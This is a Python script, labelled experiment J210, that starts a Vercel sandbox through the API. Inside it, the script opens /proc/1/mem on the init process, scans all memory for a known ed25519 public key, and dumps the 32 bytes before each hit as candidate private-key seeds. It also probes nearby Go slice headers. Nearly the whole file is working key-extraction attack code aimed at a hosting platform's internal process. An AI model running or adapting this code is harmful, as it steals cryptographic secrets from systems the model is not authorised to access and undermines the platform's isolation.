# 实验J210: 全内存定位pub(59537c81...)存储点 + 搜索相邻ed25519 seed(私钥)
# j207: b64 pub = WVN8gckgVwKEruLqKSkUTl0eNyYDQzkeUh/rGeaOJUE -> 32B
# 目标: pub在内存的原始存储位置, 检查pub-32是否有seed(Go ed25519.PrivateKey = seed||pub, 64B)
# 同时dump slice header 0xe9f060/0xe9f140指向数据的更大范围看结构
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=20000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj210"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, struct
out = open("/tmp/d210.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)
def write_at(addr, b):
    os.lseek(fd, addr, 0)
    return os.write(fd, b)

PUB = bytes.fromhex("59537c81c920570284aee2ea2929144e5d1e37260343391e521feb19e68e2541")
maps = open("/proc/1/maps").read()
regions = []
for ln in maps.splitlines():
    try:
        rng, perm, off, dev, ino, *rest = ln.split()
    except ValueError:
        continue
    if "r" in perm:
        lo, hi = (int(x, 16) for x in rng.split("-"))
        if hi - lo >= 0x10000:
            regions.append((lo, hi, perm))
p("REGIONS", len(regions))

def scan(pub, tag, maxshow=200):
    hits = []
    for lo, hi, perm in regions:
        off = lo
        while off < hi:
            try:
                os.lseek(fd, off, 0)
                b = os.read(fd, min(65536, hi - off))
            except OSError:
                off += 65536
                continue
            if b:
                i = b.find(pub)
                while i >= 0:
                    hits.append((off + i, perm))
                    i = b.find(pub, i + 1)
            off += len(b)
    p("HITS", tag, len(hits))
    return hits

# PA: 全区扫描pub
p("CP", "PA")
hits = scan(PUB, "PUB")
# 只读段是否也有(默认pub?) -> 单独列
for a, perm in hits:
    p("HIT", hex(a), perm)
    # dump前后0x80
    lo = max(a - 0x80, 0)
    try:
        ctx = read_at(lo, 0x80 + len(PUB) + 0x80)
        # 找seed候选: pub前32字节
        rel = a - lo
        before = ctx[rel - 32:rel]
        after = ctx[rel + len(PUB):rel + len(PUB) + 32]
        p("CTX", hex(lo), ctx.hex())
        p("SEED_CAND", before.hex(), "| AFTER:", after.hex())
    except Exception as e:
        p("CTX_ERR", hex(a), repr(e))

# PB: 检查两个已知slice header的数据区(更大范围)
p("CP", "PB")
for hdr in (0xe9f060, 0xe9f140):
    try:
        h = read_at(hdr, 24)
        ptr, ln, cap = struct.unpack("<QQQ", h)
        p("HDR", hex(hdr), hex(ptr), ln, cap)
        data = read_at(ptr, min(0x200, ln + 0x100))
        p("HDR_DATA", data.hex())
        # ptr前后大范围(找相邻对象)
        ctx2 = read_at(ptr - 0x100, 0x300)
        p("HDR_CTX", ctx2.hex())
    except Exception as e:
        p("HDR_ERR", hex(hdr), repr(e))

# PC: 全rw区扫 "seed||pub" 候选: 直接扫PUB, 检查pub-32的熵
p("CP", "PC")
good = []
for a, perm in hits:
    if perm[:2] != "rw":
        continue
    try:
        seed = read_at(a - 32, 32)
    except Exception:
        continue
    # 熵粗判: 与pub不重叠且字节分布不规整
    nonzero = sum(1 for c in seed if c != 0)
    if nonzero >= 30:
        good.append((a, seed.hex()))
p("SEED_GOOD", len(good))
for a, sh in good[:20]:
    p("SEED", hex(a - 32), sh)

# PD: pub命中点p-0x200范围扫所有slice header({ptr,0x20,0x20}且ptr指向附近)
p("CP", "PD")
for a, perm in hits[:10]:
    lo = a - 0x200
    try:
        ctx = read_at(lo, 0x400)
    except Exception:
        continue
    for off in range(0, 0x400 - 24, 8):
        try:
            vptr, vlen, vcap = struct.unpack("<QQQ", ctx[off:off + 24])
        except Exception:
            continue
        if vlen == 0x20 and vcap == 0x20 and lo + off + 24 <= a <= lo + off + 24 + 0x100:
            p("HDR_NEAR", hex(lo + off), hex(vptr), hex(vlen), hex(vcap))
p("done")
out.close()
os.close(fd)
'''

st = run_cmd(sid, CODE, "J210", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d210.txt", "marker", 15000)
if st == "DEAD":
    print("\n!!! DEATH", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
